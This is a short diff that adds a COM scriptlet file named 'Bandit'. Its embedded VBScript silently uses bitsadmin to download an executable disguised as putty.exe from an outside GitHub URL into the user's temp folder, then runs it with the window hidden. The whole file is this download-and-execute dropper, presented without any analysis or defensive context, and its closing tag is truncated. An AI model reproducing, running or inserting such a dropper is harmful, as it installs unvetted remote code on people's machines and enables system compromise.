@@ -1,0 +1,25 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Bandit"
+    progid="Bandit"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+    remotable="true"
+	>
+</registration>
+
+<script language="VBScript">
+		<![CDATA[
+	
+Set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.Run "bitsadmin /transfer mydownloadjob /download /priority normal https://github.com/c0mp4s5/java/raw/master/putty.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\putty.exe", 0, False
+WshShell.Run "C:\\Users\\%USERNAME%\\AppData\\local\\temp\\putty.exe", 0, False
+		
+	
+		]]>
+		
+</script>
+
+</scriptlet
